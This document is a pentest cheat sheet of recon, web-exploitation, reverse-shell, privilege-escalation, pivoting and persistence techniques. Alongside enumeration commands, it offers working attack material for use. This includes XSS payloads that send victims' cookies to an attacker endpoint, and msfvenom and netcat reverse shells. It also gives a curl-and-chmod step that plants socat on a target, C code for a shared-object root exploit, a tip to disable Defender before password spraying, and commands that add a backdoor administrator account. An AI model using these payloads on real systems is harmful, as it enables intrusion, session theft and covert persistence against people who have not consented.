# Pentest cheatsheet

## Recon

### DNS

Tools to find subdomains:
- [subfinder](https://github.com/projectdiscovery/subfinder)
- [nmapper](https://www.nmmapper.com/sys/tools/subdomainfinder)
- [crt.sh](https://crt.sh)
- [dnscan](https://github.com/rbsec/dnscan)

Check for autodiscover.target-domain to see if the company use Microsoft's Office 365.

Check if dns is spoofable with [Spoofy](https://github.com/MattKeeley/Spoofy)

### Network discovery

Network sweep
```shell=
nmap -sn -n --disable-arp-ping 192.168.1.1-254 | grep -v "host down"
```
> -sn : Disable port scanning. Host discovery only.
> -n : Never do DNS resolution

First fast recon
`nmap -T5 -oN first_fast_scan <IP>`

More precise scan on top 1000 ports
`nmap -A -T5 -oN top1000_agressive_scan <IP>`

Exhaustive scan (agressive and all ports)
`nmap -v -sS -A -Pn -T5 -p- -oN all_ports_agressive_scan <IP>`

Upd scan
`nmap -v -sU -T5 -oN udp_scna <IP>`

What to note
*    Services running
*    Services version
*    OS version
Search these with [searchsploit](https://www.exploit-db.com/searchsploit) or directly on [exploit database](https://www.exploit-db.com/).
If a RCE or intresting vuln is found check on [metasploit](https://www.metasploit.com/) if a module is available. Also search on github for potential PoCs.

If ports 21 is open try to connect to FTP (use [ncftp](https://linux.die.net/man/1/ncftp)) as `Anonymous` user.

If ports 139 and 445 are open, try to enumerate SMB.
`smbclient -L <IP>`

Try to connect to the availables Shares
`smbclient -U=Anonymous -N //<IP>/share`

You can also try a nmap script
`nmap -p445 -sV --script smb-enum-services <IP>`

### Firewall bypass

If your scan doesn't show any host in the network that probably means that there is a firewall filtering your packets.

To confirm that there is a firewall in place you can use `traceroute`. If the result of `traceroute` is 30 hops of `* * *` that means there is a firewall.

To bypass the firewall and scan the machines in the network you can use this nmap with the following options : `nmap --script=firewalk --traceroute <IPs>`

> The scan must be run as root

## NFS - port 111

Enumerate nfs

```nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>```

Mount exposed nfs on your machine

```
mdkir /mnt/mount1
sudo mount <IP>:<nfs_distant_machine_path> /mnt/mount1
```

## Web

**Examine traffic through burp**

Edit DNS local config
Linux `/etc/hosts`
Windows `C:\Windows\System32\drivers\etc\hosts`

Try tu put null bytes in the url to get 404 and see server error to get server type/version.


### Dirbusting

```shell=
gobuster -w SecLists/Discovery/Web_Content/big.txt -u http://<IP>/
gobuster -w SecLists/Discovery/Web_Content/raft-large-files.txt -u http://<IP>/
```
add -x for extensions

### Subdomains enumeration

If 443 is open or an SSL port is open navigate through the cert and look for subdomains.
Or use this command
```shell=
echo | openssl s_client -connect <IP>:443  | openssl x509 -noout -text | grep DNS | sed 's/,/\n/g'
```

Then put the subdomains in a hosts file and request them with `curl`:
```shell=
curl -vv 'Host: <domain>' <IP>
```

This msf module `auxiliary/scanner/http/vhost_scanner` can be useful for bruteforcing these.

### Local File Inclusion - LFI

If you see that a page is included from a parameter you control (GET parameter, POST parameter, cookie ...) you can try to change this parameter to get internal files of the server like pages you shouldn't access. You can first try to test the `/etc/passwd` to see if the website is vulnerable.

Possible bypasses:
*   Add null byte `%00` at the end to bypass extension completion
*   Use `....//` if `../` is removed but it's not recursive
*   Check all injectable parameters (cookies, get and post parameters)
*   use url encode or double url encore to bypass filters
*   use php-filters to get page content

### Server Side Request Forgery - SSRF

Look for an url in get or post parameter

*   If the ssrf is triggered by an xss and you want to force the admin to hit an internal endpoint but you don't know the url you can use a payload like this ```<script>window.location=`/internal/endpoint`</script>``` or `<script>fetch('/internal/endpoint')</script>` and the url will be completed by the one of the admin site
*   Try to change the url to force the server to either request an api endpoint you should not be able to or your own server to reveal secrets like api keys
*   use `api.website.com/api/flag&x=` to remove the end of the url for the server request
*   use `x/../flag` to bypass filters
*   to bypass deny list use localhost references such as 0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001 or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io
*   to bypass an allow list for example allowing only url starting by `website.com` you can register a subdomain of your website like `website.com.www.blank.com`
*   if the filters bypass don't work you can still try to find an endpoint which allows open redirect and exploit it to expose internal resources

### Cross side Scripting - XSS

Standard payload:
`<script>alert('XSS');</script>`

Control of input tag:
`"><script>alert('XSS');</script>`

Control of text area:
`</textarea><script>alert('content')</script>`

Control of script tag:
`';alert('XSS');//`

`script` removal filter bypass:
`<sscriptcript>alert('XSS');</sscriptcript>`

Control of image path:
`/images/cat.jpg" onload="alert('XSS');`

for `'` filter use `"` to bypass

Polyglot payload
```html=
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e`
```

redirect the user directly to you endpoint
```
<script>document.location='<your-endpoint>'.concat(document.cookie)</script>
```

Exfiltrate data:
`<script>fetch('http://<IP:PORT>?cookie=' + btoa(document.cookie) );</script>`

[OWASP's Filter evasion cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

#### DOM based XSS

redirect the user to your your server exfiltrating his cookie
```js=
';document.location.href='<your-server>?cookie='.concat(document.cookie);//
```

#### Reflected XSS

When your input is reflected inside a html tag you can add an event to execute some javasctipt inside the tag
```
'onmouseover='fetch("<your-endpoint>?cookie=".concat(document.cookie))
```

#### AngularJS

[Reference cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)

To generate an angular 1.6+ xss without quotes you can use [this script](https://github.com/0xblank/scripts/blob/master/generate_agular_xss.py).

#### CSP bypass

Check your csp with [Google's CSP evaluator](https://csp-evaluator.withgoogle.com/).

*   ```<script>window.location=`<ip>`</script>```

For CSP like `script-src 'unsafe-inline'` you can use the following payload:
```html=
<img src="" onerror="let u='//<you-endpoint>?t='.concat(btoa(<value-to-exfiltrate>));document.location=u"></img>
```


### Command injection

[Cheatsheet](https://github.com/payloadbox/command-injection-payload-list)

Detection of blind command injection :
*   `ping`
*   `sleep` on linux, `timeout` on windows
*   `>`

Bypass filters:
*   Use hexadecimal

## FTP - port 21

Banner grabbing

```shell=
nc -vn <IP> 21
```

```
ftp <IP>
>anonymous
>anonymous
>ls -a # List all files (even hidden) (yes, they could be hidden)
>binary #Set transmission to binary instead of ascii
>ascii #Set transmission to ascii instead of binary
>passive #deactivate the passive mode
```

## SMB/Samba - ports 139,445

If smb service is running first start enumerating the shares with `smbclient -L //<ip>`.
Then try to access the share as guest `smbclient //<ip>/sharename -U guest`

## Windows specific

### RDP - port 3389

[How does RDP work ?](https://www.cyberark.com/resources/threat-research-blog/explain-like-i-m-5-remote-desktop-protocol-rdp)

Common vulnerabilities:
- Blue keep (CVE-2019-0708) is an RCE vulnerability in Microsoft’s RDP server, affecting Windows machines from Windows 2000 to Windows 7 and Windows Server 2008 R2.
References :
    -    https://www.zerodayinitiative.com/blog/2019/5/27/cve-2019-0708-a-comprehensive-analysis-of-a-remote-desktop-services-vulnerability
    - https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/
    - https://www.malwaretech.com/2019/05/analysis-of-cve-2019-0708-bluekeep.html
    - https://www.coresecurity.com/blog/low-level-reversing-bluekeep-vulnerability-cve-2019-0708
    https://blog.tetrane.com/2020/01/22/bluekeep.html
- DejaBlue (CVE-2019-1181 & CVE-2019-1182) is another RCE vulnerability in Microsoft’s RDP server (hence the name) discovered in 2019.
References:
    - https://www.malwaretech.com/2019/08/dejablue-analyzing-a-rdp-heap-overflow.html
    - https://cyberx-labs.com/blog/analyzing-the-dejablue-heap-overflow-vulnerability/#_Toc28622447

**How to secure RDP**

There are general recommendations to follow that can make the task of attacking your RDP server a lot more difficult for attackers. There are 2 simple actions you can take that will:
- Prevent the exposure of your RDP servers to the internet, keeping them behind your firewall.
- Enable NLA

This can minimize the attack surface by limiting potential attackers only to those who are in your network and have already been authenticated.

### Office 365 / Exchange

#### Password spraying

Tools:
[MailSnpier](https://github.com/dafthack/MailSniper)
> Disable Defender's Real-Time protection first

[SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)

## Reverse shells

[Craft reverse shells](revshells.com)

[Usefull resource for referse shells](https://delta.navisec.io/reverse-shell-reference/)

### Msfvenom

Tool to generate reverse shells payloads

#### Meterpreter payloads

Linux Executable and Linkable Format (elf)

``msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<you-ip> LPORT=<listener-port> -f elf > rev_shell.elf``

Windows

``msfvenom -p windows/meterpreter/reverse_tcp LHOST=<you-ip> LPORT=<listener-port> -f exe > rev_shell.exe``

PHP

``msfvenom -p php/meterpreter_reverse_tcp LHOST=<you-ip> LPORT=<listener-port> -f raw > rev_shell.php``

ASP
``msfvenom -p windows/meterpreter/reverse_tcp LHOST=<you-ip> LPORT=<listener-port> -f asp > rev_shell.asp``

Python

``msfvenom -p cmd/unix/reverse_python LHOST=<you-ip> LPORT=<listener-port> -f raw > rev_shell.py``


## Privesc

[Navisec's privesc documentation](https://delta.navisec.io/privilege-escalation/)

**Payload all the things**

[Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
[Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Automated tools

- All platforms:
    - [BeRoot](https://github.com/AlessandroZ/BeRoot)
- Linux:
    - [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
    - [Linux exploit suggester](https://github.com/mzet-/linux-exploit-suggester)
- Windows:
    - [Windows Exploit Suggester New Genration](https://github.com/bitsadmin/wesng)
    - [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
    - [Watson](https://github.com/rasta-mouse/Watson)
    - [Sherlock](https://github.com/rasta-mouse/Sherlock)
    - [windows Exploit suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
    - [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

### Platform specific privescs

#### Linux

Exploit available binaries : https://gtfobins.github.io/

Things to check :
*   Commands runnable with sudo `sudo -l`
    *   if commands are runnable with `NOPASSWORD` then chekc gtfobins
    *   if commands are runnable with `SETENV` that means you can use this to set an environment variable like `PYTHONPATH` like this `sudo -u <user> PYTHONPATH=<your/python/path> <command>`. This will force the program to execute the scripts in the given path whith the rights of the sudo user. Don't forget you can always create files in `/tmp`.
    *   abuse wilcard commands
*   Check users commands history `cat ~/.*history | less`
*   Suid files `find / -perm -4000 2>/dev/null`
*   cron jobs `crontab -l`, `cat /etc/cron.d`
    *   Abuse wildcard commands
    *   Abuse environment variables
*   Polkit vulnerability
*   [Dirty cow](https://www.exploit-db.com/exploits/40616)
*   [mysql running as root](https://www.exploit-db.com/exploits/1518)
*   Writable `/etc/shadow`: generate a new hash with `mkpasswd -m sha-512 <new_password>` and replace the one of an user or create a new user
*   Writable `/etc/password`: generate a new password hash with `openssl passwd newpasswordhere` and then replace the `x` of a user or create a new one
*   Readable `/etc/shadow`: read the password's hash of the users and try to crack them
*   Readable ssh keys (use it to connect as the user)
    *   If the ssh key is password protected you can use `ssh2jonh.py id_rsa > tojohn.txt` to convert it into a hash and the crack the password with `john tojohntxt`
*   writable `know_hosts` file: add your `id_rsa.pub` key in it and then connect as the user
*   Secrets in config files
*   Abuse NFS configuration:
    *   Check: `cat /etc/exports`
    *   Exploit: 
        *   Mount the nfs on your machine `sudo mksir /tmp/nfs;sudo mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs`
        *   Generate payload `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`
        *   Add suid bit and execution `chmod +xs /tmp/nfs/shell.elf`
        *   Execute the payload on the machine `/tmp/shell.elf`
*   Abuse kernel exploits (
*   Abuse old bash versions
    *   bash < 4.2-048:
        *   Find a suid binary, check with `strings` what linux binary it's using
        *   Create a function with the same name `function <path_to_used_binary> { /bin/bash -p; };`
        *   Export it `export -f /usr/sbin/service`
        *   Run the suid binary
*   Hijack shared objects ([resource](https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Abusing%20Shared%20Libraries%20-%20boiteaklou.pdf)):
    *   requirements:
        *   a suid binary or a binary callable with sudo
        *   a way to make  the binary call a shared object you wrote:
            *   shared object does not exist => create it
            *   shared object is writable => overwrite it
            *   binary is callable with sudo and keeps `LD_LIBRARY_PATH` variable => export the env variable when calling the binary
            *   `/etc/ld.so.conf.d` contains a config file which points to somewhere you can write => put your exploit in the pointed path
    *   how to check exploitability:
        *   Check loaded shared objects and if there is variables like RUNPATH: `readelf -d ./binary`
        *   Check if the binary finds the shared objects `ldd binary`
        *   
    *   how to exploit:
        *   write your exploit (you can replace the function name by a function used by the binary):
            ```c
            #include <stdio.h>
            #include <unistd.h>
            #include <sys/types.h>
            void _init(){
                setreuid(geteuid(), geteuid());
                system("/bin/bash -p");
            }
            ```
        *   compile it: `gcc -shared -fPIC -nostartfiles -o lib.so exploit.c`
        *   put it somewhere where the binary will load it
        *   run the binary

#### Windows

Exploit windows native binaries : [LOLBAS](https://lolbas-project.github.io/)

Privesc techniques:
- Unquoted path ([detailed article](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)):
    -   Identify a unquoted path used in a service or scheduled task
    -   Create a payload (msfvenom) that will be called by the service or scheduled task because of the withespace in the path
    -   Restart the service or the machine if the service or scheduled task is called at start

## Pivoting

Resources :
*    https://tryhackme.com/room/wreath

### Linux

#### Network discovering

Local files to check
```shell=
/etc/hosts
/etc/resolv.conf
```

Commands to try
```shell=
nmcli dev show
arp -a
```

Bash one-liner full ping sweep of the network
`for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done`

Bash one-liner port scan
`for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done`

Use compiled tools : https://github.com/andrew-d/static-binaries

Compiled nmap : https://github.com/ernw/static-toolbox/releases/download/1.04/nmap-7.80SVN-x86_64-a36a34aa6-portable.zip

Scan though a proxy

### Windows

#### Network discovering

Local files to check
```shell=
C:\Windows\System32\drivers\etc\hosts
```

Commands to try
```shell=
ipconfig /all
arp -a
```
Import and compile tools :

https://github.com/MuirlandOracle/C-Sharp-Port-Scan

https://github.com/MuirlandOracle/CPP-Port-Scanner


### Proxies

**TL;DR**

*   Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
*   SSH can be used to create both port forwards, and proxies
plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
*   Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
*   Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
*   sshuttle is a nicer way to create a proxy when we have SSH access on a target

#### Proxychains

Create (or edit) config file `/etc/proxychains.conf` or create a local `./proxychains.conf` or `~/.proxychains/proxychains.conf` file.

Only tcp scans, specify `-Pn` to forbid icmp scans.

#### Foxyproxy

Use [foxyproxy](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-basic/) for web apps.

#### SSH Port Fordwarding 

If you have an ssh access on a first server you can use it for ssh tunneling to access the service the distant network as if it was running locally.

```shell=
ssh -L <local-port>:<remote-ip>:<distant-port> <user>@<local-ip> -fN
```

#### SSH Proxy

You can also setup a ssh proxy with the `-D` option

```shell=
ssh -D <local-port> <user>@<distant-ip> -fN
```

#### Reverse ssh connection

If you have a shell on the distant machine but no ssh access, you can connect from the distant machine to your local one using a reverse connection. To do so, follow these steps :
* `ssh-gen` on the distant machine to generate a pair of rsa keys
* copy the content of the `.pub` in your local `~/ssh/authorized_keys` file
* check if the ssh service is running on your local machine with `sudo systemctl status ssh`. If it is not running, start it with `sudo systemctl start ssh`
* On your local machine type the following command `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty` and then paste the public key
* Now it's time to connect back with the following command from the distant machine `ssh -R <local-port>:<distant-machine-ip>:<distant-machine-port> <local-user>@<local-ip> -i <keyfile> -fN` or `ssh -R <local-port> <local-user>@<local-ip> -i <keyfile> -fN` for newer ssh versions

#### plink.exe

[plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) is a Windows command line version of the PuTTY SSH client. Useful mostly on old windows servers as recent versions of windows have ssh built-in.

`ssh-keygen` won't work properly here, you will need to use `puttygen` to convert them into a `.ppk` file.

```shell=
puttygen <keyfile> -o keyfile.ppk
```

Then transfer the `.ppk` file to the distant windows machine and add the key to the `authorized_keys` file on your local machine.

Run this command on the distant windows server
```shell=
cmd.exe /c echo y | .\plink.exe -R <local-port>:<remote-ip>:<remote-port> <local-user>@<local-ip> -i <keyfile> -N
```

#### Socat

[Linux static binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)

[Windows static binaries](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download)

Check [here](https://tryhackme.com/room/introtoshells) for encrypted shells and custom compilation.

On your local machine run `sudo python3 -m http.server 80`

Then on target `curl <local-ip>/socat -o /tmp/socat-<local-username> && chmod +x /tmp/socat-<local-username>`

And now you have a socat binary on the target.

##### Reverse shell relay

Now let's connect back to our own machine from the target.

To do that, first start a listener on your local machine `sudo nc -lvnp <local-port>`.
> Good port to use to bypass firewall are 80 or 443

Next connect with `socat` from the target : `./socat tcp-l:<relay-port> tcp:<local-ip>:<local-port> &`

Now it's time to create a reverse shell to the newly open port `relay-port` on the target. Run the following command on the target server : `nc 127.0.0.1 <relay-port> -e /bin/bash`

The problem with this method is that it opens a port on the relay server, for a more quiet method see the next section.

##### Port forwarding - Classic

Then create the port forward run the next command on your local machine : `./socat tcp-l:<relay-port>,fork,reuseaddr tcp:<target-ip>:<target-port> &`

Now the `distant-port` should now be forwarded to the relay server meanning that you can access the distant service from `relay-ip:relay-port`

##### Port forwarding - Quiet

First run this on your local machine `socat tcp-l:<local-port1> tcp-l:<local-port2>,fork,reuseaddr &`

Then run this on the relay server `./socat tcp:<local-ip>:<local-port1> tcp:<target-ip>:<target-port>,fork &`

Now the `target-port` should now be forwarded to localhost meanning that you can access the distant service from `localhost:local-port2`.

To stop the port forwarding you have to run the `jobs` command and the kill all socat processes using `kill %<job-bumber>`

> TODO : Add crypted reverse shells see [shells room](https://tryhackme.com/room/introtoshells) step 7

### Chisel

[Chisel](https://github.com/jpillora/chisel) is a tool that can be used to setup a tunneled proxy or port forward through a compromised system. Written in go, it can be compiled for any system.

If you have an ssh access you can use the following command to copy the chisel binary to the compromised server : `scp -i <keyfile> chisel user@target:/tmp/chisel-<username>`

#### Reverse SOCKS Proxy

First on your local machine run the following command : `./chisel server -p <local-port> --reverse &`

Then run this command on the proxy machine : `./chisel client <local-ip>:<local-port> R:socks &`

> Note that the port to send the data through will be different that the listener port.

#### Forward SOCKS Proxy

First run `./chisel server -p <listen-port> --socks5` on the proxy machine.

And then `./chisel client <proxy-ip>:<listen-port> <local-port>:socks` in your local machine. Here listen port is the open port on the proxy machine and local-port is the port we will use to send traffic through on our local machine.

As Cheisel use a SOCK5 proxy you need to update the proxychains configuration.
```shell=
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5  127.0.0.1 <local-port>
```

#### Remote port forward

Remote forward is when you connect back from a compromised target to the remote port forward.

First on your local machine run the following command : `./chisel server -p <listen-port> --reverse &`

Then run this command on the compromised server : `./chisel client <local-ip>:<listen-port> R:<local-port>:<target-ip>:<target-port> &`

Here `listen-port` is the port that you started chisel on and `local-port` is the port you wish to open on your local machine to link with the remote port.

Now you should be able the service from `distant-ip:distant-port` on `localhost:local-port`.

#### Local port forward

As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

First run `./chisel server -p <listen-port>` on the compromised server.

Then run `./chisel client <compromised-ip>:<listen-port> <local-port>:<target-ip>:<target-port>` on your local machine.

Now the `target-ip:target-port` should be accessible from `compromised-ip:listen-port`.

As you backgrounded socat processes, when you want your chisel connections you can use `jobs` to see the background jobs, then `kill %NUMBER` to kill all chisel processes.

> **Note:** When using chisel on windows upload it with `.exe` extension.

### sshuttle

[sshuttle](https://github.com/sshuttle/sshuttle) uses an SSH connection to create a tunneled proxy that acts like a new interface. In short it simulates a VPN, allowing you to route traffic through the proxy without the use of proxychains (or equivalent). A nice bonus is that all the tunneled traffic is encrypted as it uses ssh.

> **Note:** This tool only works on Linux targets

The command to connect to a server is `sshuttle -r <username>@<server-ip> <subnet--ip-range>`

> **Note:** Don't forget the mask at the end of the subnet
> **Note:** The `-N` option can be used to attemp an automatically detect the subnet using the server routing table

If the server only allows keyfile authentication you will need to use the `--ssh-cmd` command as this is not natively supported by sshuttle.

The command will look like this `sshuttle -r <username>@<server-ip> --ssh-cmd "ssh -i <keyfile>" <subnet-ip-range>`

> **Note:** If you encounter an error that looks like this:
> ```shell=
> client: Connected.
> client_loop: send disconnect: Broken pipe
> client: fatal: server died with error code 255
> ```
> This can occur when the compromised machine you're connecting to is part of the subnet you're attempting to gain access to.
> To get around this, tell sshuttle to exlude the compromised server from the subnet using the `-x <server-ip>` option.

## Persistence

### Windows

If you can run commands on the machine as `nt authorithy\system` then create an administrator account and add it to the `Remote Management Users` group.

```powershell=
PS C:\> net user blank blank /add

PS C:\> net localgroup Administrators blank /add

PS C:\> net localgroup "Remote Management Users" blank /add
```

Then you can use `net user <username>` to check the local groups of your user.

Once the user is created you can connect to the machine by using either RDP or WinRM.

If you chose WinRM, you can use [evil-winrm](https://github.com/Hackplayers/evil-winrm).

If you chose RDP, you can use [freerdp2-x11](https://packages.debian.org/fr/sid/freerdp2-x11).
